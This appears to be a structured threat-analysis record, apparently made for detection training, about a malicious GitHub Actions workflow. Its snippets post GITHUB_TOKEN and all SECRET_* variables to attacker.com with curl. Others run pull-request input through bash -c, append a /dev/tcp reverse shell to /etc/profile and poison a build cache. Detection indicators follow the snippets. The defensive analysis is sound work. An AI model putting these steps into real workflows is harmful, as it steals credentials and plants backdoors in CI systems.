@@ -1,0 +1,191 @@
+{
+  "package_info": {
+    "package_name": "malicious-github-actions-workflow",
+    "package_manager": "GitHub Actions",
+    "package_versions": "N/A (applies to workflow YAML definitions, not versioned packages)",
+    "why_malicious": "The entire workflow is considered malicious because it is designed to exfiltrate secrets, abuse privileged tokens, inject arbitrary code, and compromise build artifacts or self-hosted runners by leveraging the flexibility and permissions of CI/CD pipeline definitions. Attackers can modify or introduce workflow files to execute code with elevated privileges, access sensitive secrets, and pivot to other resources. This enables credential theft, persistent access, and supply chain compromise within the CI/CD environment."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "pull_request_target event",
+        "file_location": ".github/workflows/ci.yml",
+        "required_permissions": [
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Exfiltrate secrets\n    run: |\n      curl -X POST -d \"token=$GITHUB_TOKEN\" https://attacker.com/exfil",
+      "code_language": "yaml/shell",
+      "code_behavior": "On pull_request_target event, the code reads the GITHUB_TOKEN environment variable and sends its value to an attacker-controlled domain via HTTP POST, enabling credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "This behavior is suspicious because it exfiltrates sensitive tokens to an external server, which is not a legitimate part of any build or test process and directly exposes privileged credentials.",
+        "violated_expectations": "Normal workflows should never send secrets or tokens to external, untrusted domains. Legitimate workflows use tokens only for internal API calls or artifact publishing within trusted infrastructure.",
+        "similar_legitimate_use": "A legitimate workflow might use curl to upload build artifacts to a trusted internal server, but never secrets or tokens to an unknown or untrusted domain.",
+        "key_indicators": [
+          "Use of curl or similar tools to send secrets externally",
+          "Accessing GITHUB_TOKEN or other secrets in workflow steps",
+          "Hardcoded external URLs not associated with the organization"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "workflow_run or pull_request event",
+        "file_location": ".github/workflows/validate.yml",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Validate PR\n    run: |\n      bash -c \"$INPUT_FROM_PR\"",
+      "code_language": "yaml/shell",
+      "code_behavior": "On workflow_run or pull_request event, the code executes user-controlled input (such as PR title or comment) as a shell command, allowing arbitrary code execution in the CI environment.",
+      "malice_analysis": {
+        "why_suspicious": "This is suspicious because it allows untrusted user input to be executed as code, which is a classic injection vulnerability and can lead to full compromise of the CI runner.",
+        "violated_expectations": "Validation scripts should sanitize and validate all user input, never directly executing it as code. Executing unsanitized input violates basic security best practices.",
+        "similar_legitimate_use": "Legitimate workflows may use user input for configuration, but only after strict validation and sanitization to prevent code injection.",
+        "key_indicators": [
+          "Direct execution of variables derived from user input",
+          "Lack of input sanitization or validation",
+          "Use of bash -c or similar constructs with untrusted data"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "push to unprotected branch / draft pull request",
+        "file_location": ".github/workflows/exfil-secrets.yml",
+        "required_permissions": [
+          "environment_vars",
+          "network"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Exfiltrate all secrets\n    run: |\n      for secret in $(env | grep SECRET_ | cut -d= -f1); do\n        curl -X POST -d \"$secret=${!secret}\" https://attacker.com/exfil\n      done",
+      "code_language": "yaml/shell",
+      "code_behavior": "On push or draft pull request, the code iterates over all environment variables matching SECRET_*, sending their values to an external domain, enabling mass secret exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "This is suspicious because it systematically exfiltrates all secrets available to the workflow, which is never a legitimate action and indicates intent to harvest credentials.",
+        "violated_expectations": "Workflows should use secrets only for their intended internal purpose, not enumerate and transmit them externally. Enumerating and exfiltrating all secrets is a clear violation of security boundaries.",
+        "similar_legitimate_use": "No legitimate use for exfiltrating all secrets; secrets should only be used for specific internal deployment or publishing tasks.",
+        "key_indicators": [
+          "Enumeration of environment variables for secrets",
+          "Looping over secrets and sending them externally",
+          "Use of curl or similar tools to transmit secret values"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "workflow with self-hosted runner",
+        "file_location": ".github/workflows/compromise-runner.yml",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "runner host access"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Install backdoor\n    run: |\n      echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/profile",
+      "code_language": "yaml/shell",
+      "code_behavior": "On workflow execution on a self-hosted runner, the code appends a reverse shell command to /etc/profile, establishing persistent remote access for the attacker.",
+      "malice_analysis": {
+        "why_suspicious": "This is highly suspicious as it modifies system-wide profile files to establish a backdoor, which is a classic persistence technique and enables ongoing unauthorized access.",
+        "violated_expectations": "Workflows should not modify system files or establish network listeners for remote shells. Modifying /etc/profile is outside the scope of normal CI/CD operations.",
+        "similar_legitimate_use": "No legitimate use for this behavior in CI workflows; system file modification for backdoor installation is always malicious.",
+        "key_indicators": [
+          "Modification of /etc/profile or other system files",
+          "Presence of reverse shell commands in workflow steps",
+          "Targeting self-hosted runners for persistent access"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "workflow with cache usage",
+        "file_location": ".github/workflows/cache-poison.yml",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Poison cache\n    run: |\n      echo 'malicious code' > ~/.cache/build-cache",
+      "code_language": "yaml/shell",
+      "code_behavior": "During workflow execution, the code writes malicious data to the build cache, which may later be used by other workflows, enabling cache poisoning and potential supply chain compromise.",
+      "malice_analysis": {
+        "why_suspicious": "This is suspicious because it introduces untrusted data into shared caches, which can compromise subsequent builds and propagate malicious code.",
+        "violated_expectations": "Build caches should only contain trusted, validated data. Writing arbitrary or malicious content to shared caches violates integrity controls.",
+        "similar_legitimate_use": "Legitimate workflows may write to caches, but not with arbitrary or malicious content; cache data should be validated and originate from trusted build steps.",
+        "key_indicators": [
+          "Writing arbitrary data to shared cache locations",
+          "No validation or integrity checks on cache contents",
+          "Modification of cache files outside normal build artifact generation"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker gains access to modify or introduce a workflow file (e.g., via pull request, branch push, or new repository creation).",
+      "implemented_by": [],
+      "leads_to": "Malicious workflow is executed in the CI environment."
+    },
+    {
+      "step": 2,
+      "action": "Malicious workflow executes, exfiltrating secrets or tokens to attacker-controlled infrastructure.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Attacker obtains credentials for further compromise."
+    },
+    {
+      "step": 3,
+      "action": "Workflow executes user-controlled input as code, enabling arbitrary code execution.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker can run arbitrary commands in the CI environment."
+    },
+    {
+      "step": 4,
+      "action": "On self-hosted runners, workflow installs persistent backdoor for ongoing access.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "Attacker maintains persistent access to the runner host."
+    },
+    {
+      "step": 5,
+      "action": "Workflow poisons build cache with malicious data.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Subsequent builds may be compromised by poisoned cache, enabling supply chain attacks."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Workflow steps that access and transmit secrets or tokens to external domains using network utilities (e.g., curl, wget).",
+      "Execution of user-controlled input as shell commands without sanitization (e.g., bash -c with variables from PRs or comments).",
+      "Modification of system files (e.g., /etc/profile) from workflow steps, especially on self-hosted runners.",
+      "Writing arbitrary or unvalidated data to shared build caches (e.g., ~/.cache/build-cache)."
+    ],
+    "file_indicators": [
+      ".github/workflows/* with suspicious run steps containing curl, bash -c, or reverse shell patterns",
+      "Workflows that enumerate environment variables for secrets (e.g., env | grep SECRET_)",
+      "Workflows that modify /etc/profile or other system files",
+      "Unusual cache file modifications such as ~/.cache/build-cache with non-standard content"
+    ],
+    "network_indicators": [
+      "Outbound HTTP/HTTPS requests to non-corporate or untrusted domains (e.g., attacker.com, webhook.site)",
+      "Reverse shell connections to external IPs or ports (e.g., /dev/tcp/attacker.com/4444)",
+      "Unexpected API calls using GITHUB_TOKEN or Personal Access Tokens (PAT) to external services"
+    ],
+    "how_to_detect": "Monitor workflow YAML files for steps that access secrets or environment variables and transmit them externally, especially using curl, wget, or similar tools. Flag workflows that execute user input as code (e.g., bash -c with variables), modify system files, or write to shared caches without validation. Monitor network traffic from CI runners for connections to untrusted domains or IPs, and for reverse shell patterns. Use static analysis to detect suspicious patterns in workflow definitions and enforce least privilege on workflow permissions. Implement alerting for any workflow that attempts to enumerate or exfiltrate secrets, or modifies system-level files."
+  }
+}
